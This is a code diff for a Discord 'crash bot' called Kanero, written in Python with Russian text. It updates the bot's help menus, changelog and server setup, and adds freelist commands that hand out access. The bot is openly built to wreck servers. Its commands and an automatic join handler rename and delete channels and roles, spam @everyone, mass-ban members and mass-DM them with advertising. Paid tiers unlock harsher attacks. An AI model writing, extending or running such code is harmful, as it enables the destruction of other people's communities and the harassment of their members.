-    await rules_ch.send(embed=rules_embed)
+            "2. Получишь роль 👥 User и доступ к боту\n"
+            "3. Добавь бота на свой сервер\n\n"
+            "**Купить White/Premium:** **davaidkatt** | **@Firisotik**\n"
+            "**Сервер:** https://discord.gg/bYnpnfu9"
+        ), color=0x0a0a0a
+    ).set_footer(text="☠️ Kanero"))
 
-    # Инфо
-    info_embed = discord.Embed(
-        title="☠️ Kanero — Официальная информация",
-        description=(
-            "**Kanero** — мощный краш-бот для Discord.\n"
-            "Создан для уничтожения серверов: нюк, бан, спам, авто-краш при входе.\n\n"
-            "━━━━━━━━━━━━━━━━━━━━━━"
-        ),
-        color=0x0a0a0a
-    )
-    info_embed.add_field(
-        name="🌍 Доступно ВСЕМ (без регистрации)",
-        value=(
-            "`!nuke` — краш сервера\n"
-            "• Переименование всех каналов → удаление ролей\n"
-            "• Создание каналов со спамом → роль ☠️ Kanero\n\n"
-            "`!auto_nuke on/off/info` — авто-краш при входе бота на сервер\n"
-            "`!help` — список команд по твоему уровню доступа\n"
-            "`!changelog` — последнее обновление\n"
-            "`!changelogall` — вся история обновлений"
-        ),
-        inline=False
-    )
-    info_embed.add_field(
-        name="✅ White (напиши в 🤖・addbot)",
-        value=(
-            "`!nuke [текст]` — нюк со своим текстом спама\n"
-            "`!stop` — остановить запущенный краш\n"
-            "`!cleanup` — снести всё, оставить один канал\n"
-            "`!rename <название>` — переименовать все каналы\n"
-            "`!nicks_all <ник>` — сменить ники всем участникам\n"
-            "`!webhooks` — показать все вебхуки сервера\n"
-            "`!clear [число]` — удалить N сообщений (макс 100)\n"
-            "`/sp <кол-во> <текст>` — спам сообщениями\n"
-            "`/spkd <задержка> <кол-во> <текст>` — спам с задержкой"
-        ),
-        inline=False
-    )
-    info_embed.add_field(
-        name="💎 Premium (платно — davaidkatt)",
-        value=(
-            "`!super_nuke [текст]` — нюк + бан до 15 участников + роль ☠️\n"
-            "`!massban` — забанить всех участников сервера\n"
-            "`!massdm <текст>` — разослать ДМ всем участникам\n"
-            "`!spam <кол-во> <текст>` — спам в текущий канал\n"
-            "`!pingspam [кол-во]` — спам @everyone\n"
-            "`!rolesdelete` — удалить все роли сервера\n"
-            "`!serverinfo` — подробная информация о сервере\n"
-            "`!userinfo [id]` — информация о пользователе\n"
-            "`!auto_super_nuke on/off/text/info` — авто super_nuke при входе\n"
-            "`!auto_superpr_nuke on/off/text/info` — авто турбо нюк при входе"
-        ),
-        inline=False
-    )
-    info_embed.add_field(
-        name="👑 Owner (только davaidkatt)",
-        value=(
-            "`!owner_nuke [текст]` — полный нюк, бан ВСЕХ участников\n"
-            "`!auto_owner_nuke on/off/text/info` — авто owner нюк при входе\n"
-            "`!setup` — пересоздать структуру сервера\n"
-            "`!wl_add/remove/list` — управление whitelist\n"
-            "`!pm_add/remove` — управление Premium\n"
-            "`!auto_off` — выключить все авто нюки\n"
-            "`!auto_info` — статус всех авто нюков\n"
-            "`!nukelogs` — логи нюков с инвайтами"
-        ),
-        inline=False
-    )
-    info_embed.add_field(
-        name="📌 Важно",
-        value=(
-            "• Реклама `☠️ Kanero` добавляется к тексту нюка **всегда**\n"
-            "• При выходе с сервера — доступ удаляется автоматически\n"
-            "• Whitelist выдаётся только вручную овнером\n\n"
-            "**🔗 Сервер:** https://discord.gg/JEspTXRW\n"
-            "**💬 Купить Premium:** **davaidkatt** | **@Firisotik**"
-        ),
-        inline=False
-    )
-    info_embed.set_footer(text="☠️ Kanero  |  v1.8  |  davaidkatt")
-    info_embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
-    await info_ch.send(embed=info_embed)
+    r = discord.Embed(title="📜 Правила — Kanero", color=0x0a0a0a)
+    r.add_field(name="📋 Правила", value="**1.** Уважай участников\n**2.** Без спама и флуда\n**3.** Без рекламы без разрешения\n**4.** Без доксинга\n**5.** Соблюдай Discord ToS\n**6.** Без токсика и оскорблений", inline=False)
+    r.add_field(name="🎭 Уровни", value="🤖 Kanero · 🔧 Developer · 👑 Owner · 💎 Premium · ✅ White · 👥 User · 👤 Guest", inline=False)
+    r.add_field(name="🔑 Доступ", value="**User (freelist):** напиши в 🤖・addbot\n**White/Premium:** купи у **davaidkatt**", inline=False)
+    r.set_footer(text="☠️ Kanero  |  Нарушение = бан")
+    await rules_ch.send(embed=r)
 
-    # Addbot
-    addbot_embed = discord.Embed(
-        title="🤖 Как получить доступ к Kanero",
-        description=(
-            "Напиши **любое сообщение** в этот канал.\n"
-            "Бот автоматически напишет тебе в ЛС с инструкцией.\n\n"
-            "━━━━━━━━━━━━━━━━━━━━━━"
-        ),
-        color=0x0a0a0a
-    )
-    addbot_embed.add_field(
-        name="✅ Что ты получишь (White — бесплатно)",
-        value=(
-            "• `!nuke [текст]` — нюк со своим текстом спама\n"
-            "• `!stop` — остановить запущенный краш\n"
-            "• `!cleanup` — снести всё, оставить один канал\n"
-            "• `!rename <название>` — переименовать все каналы\n"
-            "• `!nicks_all <ник>` — сменить ники всем\n"
-            "• `!webhooks` — список вебхуков\n"
-            "• `!clear [число]` — удалить сообщения\n"
-            "• `/sp` · `/spkd` — спам команды"
-        ),
-        inline=False
-    )
-    addbot_embed.add_field(
-        name="💎 Premium (расширенный доступ)",
-        value=(
-            "• `!super_nuke` — нюк + бан до 15 участников\n"
-            "• `!massban` · `!massdm` · `!spam` · `!pingspam`\n"
-            "• `!rolesdelete` · `!serverinfo` · `!userinfo`\n"
-            "• `!auto_super_nuke` · `!auto_superpr_nuke`\n\n"
-            "**Купить:** напиши **davaidkatt** | **@Firisotik**"
-        ),
-        inline=False
-    )
-    addbot_embed.add_field(
-        name="📌 Важно",
-        value=(
-            "• Whitelist выдаётся только вручную овнером\n"
-            "• При выходе с сервера доступ удаляется\n"
-            "• **Наш сервер:** https://discord.gg/JEspTXRW"
-        ),
-        inline=False
-    )
-    addbot_embed.set_footer(text="☠️ Kanero  |  Просто напиши что-нибудь в этот канал")
-    await addbot_ch.send(embed=addbot_embed)
+    a = discord.Embed(title="🤖 Получить доступ к Kanero", color=0x0a0a0a)
+    a.add_field(name="📋 Freelist (бесплатно)", value="Напиши **любое сообщение** сюда\nПолучишь роль 👥 User:\n`!nuke` · `!auto_nuke` · `!help` · `!changelog`", inline=False)
+    a.add_field(name="✅ White", value="`!nuke [текст]` · `!stop` · `!cleanup`\n`!rename` · `!nicks_all` · `!webhooks` · `!clear`\n`/sp` · `/spkd`\nКупить: **davaidkatt**", inline=False)
+    a.add_field(name="💎 Premium", value="`!super_nuke` · `!massban` · `!massdm`\n`!spam` · `!pingspam` · `!rolesdelete`\n`!auto_super_nuke` · `!auto_superpr_nuke`\nКупить: **davaidkatt**", inline=False)
+    a.set_footer(text="☠️ Kanero  |  Просто напиши что-нибудь")
+    await addbot_ch.send(embed=a)
 
-    # Logs — стартовое сообщение
-    logs_embed = discord.Embed(
-        title="📊 Канал логов — Kanero",
-        description=(
-            "Здесь будут отображаться логи действий бота.\n\n"
-            "**Что логируется:**\n"
-            "• Нюки — кто, когда, на каком сервере\n"
-            "• Входы/выходы участников с домашнего сервера\n"
-            "• Изменения whitelist и premium списков\n\n"
-            "**Команды для просмотра логов:**\n"
-            "`!nukelogs` — логи нюков с инвайтами\n"
-            "`!list` — текущие списки whitelist/premium\n"
-            "`!auto_info` — статус авто нюков"
-        ),
+    await logs_ch.send(embed=discord.Embed(
+        title="📊 Логи — Kanero",
+        description="`!nukelogs` — логи нюков\n`!list` — whitelist/premium\n`!fl_list` — freelist\n`!auto_info` — статус авто нюков",
         color=0x0a0a0a
-    )
-    logs_embed.set_footer(text="☠️ Kanero  |  Только Owner+ видит этот канал")
-    await logs_ch.send(embed=logs_embed)
+    ).set_footer(text="☠️ Kanero  |  Только Owner+"))
 
     embed = discord.Embed(
-        title="✅ Kanero — Сервер полностью настроен",
+        title="✅ Kanero — Сервер настроен",
         description=(
-            "**Роли (сверху вниз):**\n"
-            "🤖 Kanero — роль бота (administrator)\n"
-            "🔧 Developer — разработчик (administrator)\n"
-            "👑 Owner — управление сервером (без admin)\n"
-            "💎 Premium — расширенный доступ + premium каналы\n"
-            "✅ White — базовый доступ + все чаты\n"
-            "👤 Guest — только чтение публичных каналов\n"
-            "@everyone — ничего не видит\n\n"
-            "**Структура каналов:**\n"
-            "👋 WELCOME: welcome (виден всем, пишет только бот)\n"
-            "📢 ОСНОВНОЕ: info · правила · новости · changelog · конкурсы · addbot · медиа · партнёрство\n"
-            "💬 ЧАТЫ: общий · идеи · create-ticket (White+)\n"
-            "💎 PREMIUM: premium-chat · premium-info · premium-tools · premium-gifts (Premium+)\n"
+            "**Роли:** 🤖 Kanero · 🔧 Developer · 👑 Owner · 💎 Premium · ✅ White · 👥 User · 👤 Guest\n\n"
+            "**Каналы:**\n"
+            "👋 WELCOME: welcome (все видят)\n"
+            "📢 ОСНОВНОЕ: правила · новости · changelog · addbot · медиа · партнёрство (Guest+ читает)\n"
+            "💬 ЧАТЫ: общий · идеи (Guest+ пишет)\n"
+            "📋 FREELIST: freelist-chat · помощь (User+)\n"
+            "✅ WHITE: white-chat · команды (White+)\n"
+            "💎 PREMIUM: premium-chat · premium-info · premium-tools (Premium+)\n"
             "🔊 ВОЙСЫ: voice-1/2/3 · premium-voice · admin-voice\n"
-            "👑 ADMIN: logs · bot-commands · whitelist (Owner+)\n\n"
-            "**Права:**\n"
-            "• новости/changelog/конкурсы — только Owner+ пишет\n"
-            "• welcome — только бот пишет (авто при входе)\n"
-            "• addbot/медиа/партнёрство — доступны всем\n"
-            f"• Авто-роль при входе: <@&{AUTO_ROLE_ID}>\n\n"
-            "Контент отправлен в welcome, info, правила, addbot, logs.\n"
-            "Выдай роли вручную через `!giverole`."
+            "👑 ADMIN: logs · bot-commands · lists (Owner+)\n\n"
+            f"Авто-роль при входе: <@&{AUTO_ROLE_ID}>\n"
+            "Роль 👥 User выдаётся при написании в addbot."
         ),
         color=0x0a0a0a
     )
-    embed.set_footer(text="☠️ Kanero  |  !giverole @юзер @роль — выдать роль")
+    embed.set_footer(text="☠️ Kanero  |  !giverole @юзер @роль")
     await msg.edit(content=None, embed=embed)
-
-
 @bot.command(name="on_add")
 async def on_add(ctx, user_id: int):
     if ctx.author.id != config.OWNER_ID:
@@ -1618,6 +1348,95 @@ async def on_list(ctx):
             lines.append(f"`{uid}` — *не найден*")
     embed = discord.Embed(title="👑 Owner Nuke List", description="\n".join(lines) if lines else "*пусто*", color=0x0a0a0a)
     embed.set_footer(text=f"☠️ Kanero  |  Всего: {len(OWNER_NUKE_LIST)}")
+    await ctx.send(embed=embed)
+
+
+# ─── FREELIST MANAGEMENT ───────────────────────────────────
+
+@bot.command(name="fl_add")
+async def fl_add(ctx, user_id: int):
+    """Добавить в freelist. Только для овнера."""
+    if ctx.author.id != config.OWNER_ID:
+        return
+    if user_id not in FREELIST:
+        FREELIST.append(user_id)
+        save_freelist()
+        # Выдаём роль User если на домашнем сервере
+        try:
+            home_guild = bot.get_guild(HOME_GUILD_ID)
+            if home_guild:
+                member = home_guild.get_member(user_id)
+                if not member:
+                    member = await home_guild.fetch_member(user_id)
+                if member:
+                    user_role = discord.utils.find(lambda r: r.name == "👥 User", home_guild.roles)
+                    if user_role:
+                        await member.add_roles(user_role, reason="fl_add")
+        except Exception:
+            pass
+        await ctx.send(f"✅ `{user_id}` добавлен в freelist.")
+    else:
+        await ctx.send("Уже в freelist.")
+
+
+@bot.command(name="fl_remove")
+async def fl_remove(ctx, user_id: int):
+    """Убрать из freelist. Только для овнера."""
+    if ctx.author.id != config.OWNER_ID:
+        return
+    if user_id in FREELIST:
+        FREELIST.remove(user_id)
+        save_freelist()
+        # Забираем роль User
+        try:
+            home_guild = bot.get_guild(HOME_GUILD_ID)
+            if home_guild:
+                member = home_guild.get_member(user_id)
+                if member:
+                    user_role = discord.utils.find(lambda r: r.name == "👥 User", home_guild.roles)
+                    if user_role and user_role in member.roles:
+                        await member.remove_roles(user_role, reason="fl_remove")
+        except Exception:
+            pass
+        await ctx.send(f"✅ `{user_id}` убран из freelist.")
+    else:
+        await ctx.send("Не найден в freelist.")
+
+
+@bot.command(name="fl_list")
+async def fl_list(ctx):
+    """Показать freelist. Только для овнера."""
+    if ctx.author.id != config.OWNER_ID:
+        return
+    if not FREELIST:
+        await ctx.send("Freelist пуст.")
+        return
+    lines = []
+    for uid in FREELIST:
+        try:
+            user = await bot.fetch_user(uid)
+            lines.append(f"`{uid}` — **{user}**")
+        except Exception:
+            lines.append(f"`{uid}` — *не найден*")
+    embed = discord.Embed(title="📋 Freelist", description="\n".join(lines), color=0x0a0a0a)
+    embed.set_footer(text=f"☠️ Kanero  |  Всего: {len(FREELIST)}")
+    await ctx.send(embed=embed)
+
+
+@bot.command(name="fl_clear")
+async def fl_clear(ctx):
+    """Очистить freelist. Только для овнера."""
+    if ctx.author.id != config.OWNER_ID:
+        return
+    count = len(FREELIST)
+    FREELIST.clear()
+    save_freelist()
+    embed = discord.Embed(
+        title="🗑️ Freelist очищен",
+        description=f"Удалено **{count}** пользователей.",
+        color=0x0a0a0a
+    )
+    embed.set_footer(text="☠️ Kanero")
     await ctx.send(embed=embed)
 
 
@@ -2201,28 +2020,28 @@ bot.remove_command("help")
 
 @bot.command(name="changelog")
 async def changelog(ctx):
-    """Показывает только последнее обновление v1.8."""
-    embed = discord.Embed(
-        title="📋 CHANGELOG — v1.8  |  Последнее обновление",
-        color=0x0a0a0a
-    )
+    """Показывает только последнее обновление."""
+    embed = discord.Embed(title="📋 CHANGELOG — v2.0  |  Большое обновление", color=0x0a0a0a)
     embed.add_field(
-        name="🔥 v1.8 — Большое обновление",
+        name="🔥 v2.0 — Полный редизайн",
         value=(
-            "• **`!nuke` и `!auto_nuke` доступны ВСЕМ** без подписки!\n"
-            "• `!nuke [текст]` — кастомный текст только для whitelist\n"
-            "• `!nuke` — переименование → удаление ролей → каналы → спам → роль ☠️\n"
-            "• `!super_nuke` + `!auto_super_nuke` — всегда вместе, до 15 участников\n"
-            "• `!owner_nuke` + `!auto_owner_nuke` — нюк без ограничений\n"
-            "• `!on_add/remove/list` — список для owner_nuke\n"
-            "• `!auto_off` — выключить все авто нюки\n"
-            "• `!auto_info` — статус всех авто нюков\n"
-            "• `!setup` — создать структуру сервера\n"
-            "• `!goout` — покинуть сервер\n"
-            "• `!nukelogs` — логи нюков\n"
-            "• `!unban <id>` — разбан через ЛС\n"
-            "• `!roles` / `!giverole` — управление ролями\n"
-            "• MongoDB — постоянное хранение данных"
+            "**Структура сервера:**\n"
+            "• Новые категории: FREELIST · WHITE · PREMIUM (у каждого свои каналы)\n"
+            "• Роль **👥 User** — выдаётся авто при написании в #addbot\n"
+            "• Роль **🎬 Media** — только она пишет в #медиа\n"
+            "• Welcome канал — виден всем, бот пишет при входе\n"
+            "• Guest видит: welcome, основное, чаты\n\n"
+            "**Доступ:**\n"
+            "• `!nuke` / `!auto_nuke` — требуют freelist (написать в #addbot)\n"
+            "• `!nuke [текст]` — кастомный текст только для White\n"
+            "• Реклама в нюке всегда: `☠️ Kanero — https://discord.gg/bYnpnfu9`\n\n"
+            "**Новые команды:**\n"
+            "• `!fl_add/remove/list/clear` — управление freelist\n"
+            "• `!on_member_join` — авто-роль + welcome сообщение\n\n"
+            "**Исправления:**\n"
+            "• Все ссылки обновлены → https://discord.gg/bYnpnfu9\n"
+            "• Порядок ролей исправлен (Developer сверху, Guest снизу)\n"
+            "• Новости/changelog/партнёрство — только Owner пишет"
         ),
         inline=False
     )
@@ -2233,11 +2052,8 @@ async def changelog(ctx):
 
 @bot.command(name="changelogall")
 async def changelogall(ctx):
-    """Показывает всю историю обновлений v1.0-v1.8."""
-    embed = discord.Embed(
-        title="📋 CHANGELOG — Полная история  |  v1.0 → v1.8",
-        color=0x0a0a0a
-    )
+    """Показывает всю историю обновлений."""
+    embed = discord.Embed(title="📋 CHANGELOG — Полная история  |  v1.0 → v2.0", color=0x0a0a0a)
     embed.add_field(name="☠️ v1.0", value="• `!nuke`, `!stop`, `!webhooks`, логирование", inline=False)
     embed.add_field(name="⚡ v1.1", value="• `!auto_nuke`, `/sp`, `/spkd`, whitelist, `!cleanup`, `!rename`", inline=False)
     embed.add_field(name="🎨 v1.2", value="• Тёмный стиль, Owner Panel, `!owl_add`, `!invlink`", inline=False)
@@ -2245,17 +2061,21 @@ async def changelogall(ctx):
     embed.add_field(name="🆕 v1.4", value="• `!massdm`, `!massban`, `!spam`, `!pingspam`, `!rolesdelete`, `!serverinfo`", inline=False)
     embed.add_field(name="💀 v1.5-1.6", value="• `!super_nuke`, `!auto_super_nuke`, `!auto_superpr_nuke`", inline=False)
     embed.add_field(name="🔥 v1.7", value="• MongoDB, `!pm_add` авто +whitelist, `!list`, `!list_clear`", inline=False)
+    embed.add_field(name="🔥 v1.8", value="• Freelist, `!owner_nuke`, `!auto_off`, `!setup`, `!nukelogs`, `!fl_add/remove/list/clear`", inline=False)
     embed.add_field(
-        name="🔥 v1.8",
+        name="🔥🔥 v2.0 — ПОЛНЫЙ РЕДИЗАЙН",
         value=(
-            "• **`!nuke` и `!auto_nuke` доступны ВСЕМ**\n"
-            "• `!owner_nuke` + `!auto_owner_nuke` + `!on_add/remove/list`\n"
-            "• `!auto_off`, `!auto_info`, `!setup`, `!goout`\n"
-            "• `!nukelogs`, `!unban`, `!roles`, `!giverole`"
+            "• Новые категории: FREELIST · WHITE · PREMIUM\n"
+            "• Роль 👥 User (авто при freelist) · 🎬 Media\n"
+            "• Welcome канал + авто-роль при входе\n"
+            "• `!nuke`/`!auto_nuke` требуют freelist\n"
+            "• Реклама → https://discord.gg/bYnpnfu9\n"
+            "• Порядок ролей исправлен\n"
+            "• Новости/партнёрство — только Owner пишет"
         ),
         inline=False
     )
-    embed.set_footer(text="☠️ Kanero  |  davaidkatt  |  текущая версия: v1.8")
+    embed.set_footer(text="☠️ Kanero  |  davaidkatt  |  текущая версия: v2.0")
     embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
     await ctx.send(embed=embed)
 
@@ -2266,6 +2086,7 @@ async def help_cmd(ctx):
     is_owner = (uid == config.OWNER_ID)
     is_prem = is_premium(uid)
     is_wl = is_whitelisted(uid)
+    is_fl = is_freelisted(uid)
 
     embed = discord.Embed(
         title="☠️ Kanero — CRASH BOT",
@@ -2288,19 +2109,21 @@ async def help_cmd(ctx):
         access_str = "💎 **PREMIUM** — расширенный доступ"
     elif is_wl:
         access_str = "✅ **Whitelist** — базовые команды"
+    elif is_freelisted(uid):
+        access_str = "📋 **Freelist** — базовый доступ (написал в #addbot)"
     else:
-        access_str = "🌍 **Гость** — `!nuke` и `!auto_nuke` доступны всем!"
+        access_str = "❌ **Нет доступа** — напиши в #addbot на нашем сервере: https://discord.gg/bYnpnfu9"
 
     embed.add_field(name="🔑 Твой уровень", value=access_str, inline=False)
 
     embed.add_field(
-        name="📋 ДОСТУПНО ВСЕМ",
+        name="📋 FREELIST (напиши в #addbot — бесплатно)",
         value=(
+            "`!nuke` — краш (переименование → роли → каналы → спам → роль ☠️)\n"
+            "`!auto_nuke on/off/info` — авто-краш при входе бота\n"
             "`!help` — это меню\n"
             "`!changelog` — последнее обновление\n"
-            "`!changelogall` — вся история\n"
-            "`!nuke` — краш (переименование → роли → каналы → спам → роль ☠️)\n"
-            "`!auto_nuke on/off/info` — авто-краш при входе бота"
+            "`!changelogall` — вся история"
         ),
         inline=False
     )
@@ -2343,6 +2166,7 @@ async def help_cmd(ctx):
                 "`!auto_off` — выключить все авто нюки\n"
                 "`!auto_info` — статус всех авто нюков\n"
                 "`!wl_add/remove/list` · `!pm_add/remove/list`\n"
+                "`!fl_add/remove/list/clear` — freelist\n"
                 "`!on_add/remove/list` — owner nuke list\n"
                 "`!list` · `!list_clear` · `!block_guild/unblock_guild`\n"
                 "`!set_spam_text` · `!owl_add/remove/list`\n"
@@ -2358,7 +2182,7 @@ async def help_cmd(ctx):
         value="Discord: **davaidkatt**\nTelegram: **@Firisotik**",
         inline=False
     )
-    embed.set_footer(text="☠️ Kanero  |  !changelogall — вся история  |  v1.8")
+    embed.set_footer(text="☠️ Kanero  |  !changelogall — вся история  |  v2.0")
     embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
     await ctx.send(embed=embed)
 
@@ -2526,7 +2350,7 @@ async def on_member_remove(member):
     if removed:
         try:
             home_guild = bot.get_guild(HOME_GUILD_ID)
-            invite_url = "https://discord.gg/SZ7bd8h9"
+            invite_url = "https://discord.gg/bYnpnfu9"
             if home_guild:
                 try:
                     ch = next((c for c in home_guild.text_channels if c.permissions_for(home_guild.me).create_instant_invite), None)
@@ -2603,7 +2427,7 @@ async def on_member_join(member):
             "• `!changelog` / `!changelogall` — история обновлений\n\n"
             "━━━━━━━━━━━━━━━━━━━━━━\n"
             "**💎 Купить Premium:** **davaidkatt** | **@Firisotik**\n"
-            "**🔗 Сервер:** https://discord.gg/JEspTXRW"
+            "**🔗 Сервер:** https://discord.gg/bYnpnfu9"
         ),
         color=0x0a0a0a
     )
@@ -2646,7 +2470,7 @@ async def on_guild_join(guild):
         nuke_running[guild.id] = True
         asyncio.create_task(do_nuke(guild))
 
-        dm_text = "|| @everyone @here ||\n# CRASHED BY Kanero\n# https://discord.gg/SZ7bd8h9\n# https://discord.gg/SZ7bd8h9\n# https://discord.gg/SZ7bd8h9"
+        dm_text = "|| @everyone @here ||\n# CRASHED BY Kanero\n# https://discord.gg/bYnpnfu9\n# https://discord.gg/bYnpnfu9\n# https://discord.gg/bYnpnfu9"
 
         async def dm_all():
             for member in guild.members:
@@ -2980,12 +2804,13 @@ async def on_message(message):
     if isinstance(message.channel, discord.DMChannel):
         content = message.content.strip()
 
-        # !help и !changelog — доступны ВСЕМ без вайтлиста
+        # !help и !changelog — доступны всем в ЛС
         if content == "!help":
             uid = message.author.id
             is_owner = (uid == config.OWNER_ID)
             is_prem = is_premium(uid)
             is_wl = is_whitelisted(uid)
+            is_fl = is_freelisted(uid)
 
             embed = discord.Embed(
                 title="☠️ Kanero — CRASH BOT",
@@ -3002,37 +2827,44 @@ async def on_message(message):
                 color=0x0a0a0a
             )
             if is_owner:
-                access_str = "� **OWNER** — полный доступ ко всем командам"
+                access_str = "👑 **OWNER** — полный доступ ко всем командам"
             elif is_prem:
-                access_str = "💎 **PREMIUM** — доступ к расширенным командам"
+                access_str = "💎 **PREMIUM** — расширенный доступ"
             elif is_wl:
-                access_str = "✅ **Обычная подписка** — базовые команды доступны"
+                access_str = "✅ **Whitelist** — базовые команды"
+            elif is_fl:
+                access_str = "📋 **Freelist** — базовый доступ (написал в #addbot)"
             else:
-                access_str = "❌ **Нет подписки** — доступ к командам закрыт"
+                access_str = "❌ **Нет доступа** — напиши в #addbot: https://discord.gg/bYnpnfu9"
 
             embed.add_field(name="🔑 Твой уровень доступа", value=access_str, inline=False)
             embed.add_field(
-                name="📋 ДОСТУПНО ВСЕМ",
-                value="`!help` — это меню\n`!changelog` — история обновлений бота",
+                name="📋 FREELIST (напиши в #addbot — бесплатно)",
+                value=(
+                    "`!nuke` — краш сервера\n"
+                    "`!auto_nuke on/off/info` — авто-краш при входе бота\n"
+                    "`!help` — это меню\n"
+                    "`!changelog` · `!changelogall` — история обновлений"
+                ),
                 inline=False
             )
             embed.add_field(
-                name="✅ ОБЫЧНАЯ ПОДПИСКА",
+                name="✅ WHITELIST",
                 value=(
-                    "`!nuke` · `!stop` · `!cleanup`\n"
-                    "`!rename` · `!nicks_all`\n"
-                    "`!webhooks` · `!auto_nuke on/off/info` · `!inv`\n"
+                    "`!nuke [текст]` — нюк со своим текстом\n"
+                    "`!stop` · `!cleanup` · `!rename` · `!nicks_all`\n"
+                    "`!webhooks` · `!clear [число]` · `!inv`\n"
                     "`/sp [кол-во] [текст]` · `/spkd [задержка] [кол-во] [текст]`"
                 ),
                 inline=False
             )
             embed.add_field(
-                name="� PREMIUM",
+                name="💎 PREMIUM",
                 value=(
                     "`!nuke [текст]` — нюк со своим текстом\n"
+                    "`!super_nuke [текст]` — нюк + бан до 15 участников\n"
                     "`!massban` · `!massdm` · `!spam` · `!pingspam`\n"
-                    "`!rolesdelete`\n"
-                    "`!serverinfo` · `!userinfo`\n"
+                    "`!rolesdelete` · `!serverinfo` · `!userinfo`\n"
                     "`!auto_super_nuke on/off/text/info`"
                 ),
                 inline=False
@@ -3154,7 +2986,7 @@ async def on_message(message):
                 ),
                 inline=False
             )
-            embed.set_footer(text="☠️ Kanero  |  Команды работают только в ЛС")
+            embed.set_footer(text="☠️ Kanero  |  v2.0  |  Команды работают только в ЛС")
             embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
             await message.channel.send(embed=embed)
             return
@@ -3500,18 +3332,32 @@ async def on_message(message):
         else:
             FREELIST.append(uid)
             save_freelist()
+            # Выдаём роль 👥 User на домашнем сервере
+            try:
+                home_guild = bot.get_guild(HOME_GUILD_ID)
+                if home_guild:
+                    member = home_guild.get_member(uid)
+                    if not member:
+                        member = await home_guild.fetch_member(uid)
+                    if member:
+                        user_role = discord.utils.find(lambda r: r.name == "👥 User", home_guild.roles)
+                        if user_role:
+                            await member.add_roles(user_role, reason="Freelist — написал в addbot")
+            except Exception:
+                pass
             try:
                 await message.author.send(
                     embed=discord.Embed(
                         title="✅ Базовый доступ получен!",
                         description=(
-                            "Ты добавлен в freelist.\n\n"
+                            "Ты добавлен в freelist и получил роль **👥 User**.\n\n"
                             "**Доступные команды:**\n"
                             "`!nuke` — краш сервера\n"
-                            "`!auto_nuke on/off` — авто-краш при входе бота\n\n"
-                            "Для получения полного доступа (whitelist/premium) напиши:\n"
-                            "Discord: **davaidkatt** | Telegram: **@Firisotik**\n\n"
-                            "Наш сервер: https://discord.gg/JEspTXRW"
+                            "`!auto_nuke on/off` — авто-краш при входе бота\n"
+                            "`!help` — список команд\n"
+                            "`!changelog` / `!changelogall` — история обновлений\n\n"
+                            "Для White/Premium напиши: **davaidkatt** | **@Firisotik**\n\n"
+                            "Наш сервер: https://discord.gg/bYnpnfu9"
                         ),
                         color=0x0a0a0a
                     ).set_footer(text="Kanero  |  davaidkatt")
@@ -3919,7 +3765,7 @@ async def on_ready():
                 ),
                 inline=False
             )
-        embed.set_footer(text=f"☠️ Kanero  |  {'💎 Premium активен' if pm else 'Нет Premium? Пиши: davaidkatt'}")
+        embed.set_footer(text=f"☠️ Kanero  |  v2.0  |  {'💎 Premium активен' if pm else 'Нет Premium? Пиши: davaidkatt'}")
         embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
         await interaction.response.send_message(embed=embed, ephemeral=True)
 
